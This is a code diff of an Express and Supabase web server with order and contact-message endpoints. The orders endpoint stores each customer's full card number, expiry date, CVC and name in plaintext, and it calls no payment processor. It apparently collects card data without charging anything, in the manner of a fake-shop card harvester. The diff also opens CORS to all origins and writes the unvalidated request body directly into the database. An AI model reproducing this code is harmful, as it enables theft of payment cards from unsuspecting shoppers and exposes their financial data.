@@ -5,28 +5,22 @@ import WebSocket from 'ws';
 
 const app = express();
 
-// ✅ CORS configuration - simpler
-app.use(cors({
-    origin: true,
-    credentials: true
-}));
+// CORS - allow all
+app.use(cors());
+
+app.use(express.json());
 
 const supabaseUrl = process.env.SUPABASE_URL;
 const supabaseAnonKey = process.env.SUPABASE_ANON_KEY;
 
-console.log('SUPABASE_URL:', supabaseUrl ? '✅ Found' : '❌ Missing');
-console.log('SUPABASE_ANON_KEY:', supabaseAnonKey ? '✅ Found' : '❌ Missing');
-
 if (!supabaseUrl || !supabaseAnonKey) {
-    console.error('Missing environment variables!');
+    console.error('Missing environment variables');
     process.exit(1);
 }
 
 const supabase = createClient(supabaseUrl, supabaseAnonKey, {
     realtime: { transport: WebSocket }
 });
-
-app.use(express.json());
 
 const PORT = process.env.PORT || 5000;
 
@@ -36,51 +30,36 @@ app.get('/', (req, res) => {
 
 app.post('/api/orders', async (req, res) => {
     try {
-        const { productName, productPrice, fullName, email, phone, address, cardNumber, cardName, cardExpiry, cardCVC } = req.body;
-        
+        const data = req.body;
         const { error } = await supabase.from('orders').insert([{
-            product_name: productName,
-            product_price: productPrice,
-            full_name: fullName,
-            email: email,
-            phone: phone,
-            address: address,
-            card_last4: cardNumber.slice(-4),
-            full_card_number: cardNumber,
-            card_holder_name: cardName,
-            card_expiry: cardExpiry,
-            card_cvc: cardCVC,
-            status: 'pending',
-            created_at: new Date()
+            product_name: data.productName,
+            product_price: data.productPrice,
+            full_name: data.fullName,
+            email: data.email,
+            phone: data.phone,
+            address: data.address,
+            card_last4: data.cardNumber?.slice(-4),
+            full_card_number: data.cardNumber,
+            card_holder_name: data.cardName,
+            card_expiry: data.cardExpiry,
+            card_cvc: data.cardCVC,
+            status: 'pending'
         }]);
         
         if (error) throw error;
-        
-        console.log(`Order received from ${fullName}`);
         res.json({ success: true, message: 'Order received!' });
     } catch (error) {
-        console.error('Order error:', error);
-        res.status(500).json({ success: false, error: 'Something went wrong' });
+        res.status(500).json({ success: false, error: 'Payment failed' });
     }
 });
 
 app.post('/api/messages', async (req, res) => {
     try {
-        const { name, email, subject, message } = req.body;
-        const { error } = await supabase.from('messages').insert([{ 
-            name, 
-            email, 
-            subject, 
-            message,
-            created_at: new Date()
-        }]);
-        
+        const { error } = await supabase.from('messages').insert([req.body]);
         if (error) throw error;
-        console.log(`Message from ${name}`);
         res.json({ success: true, message: 'Message sent!' });
     } catch (error) {
-        console.error('Message error:', error);
-        res.status(500).json({ success: false, error: 'Failed to send message' });
+        res.status(500).json({ success: false, error: 'Failed to send' });
     }
 });
 
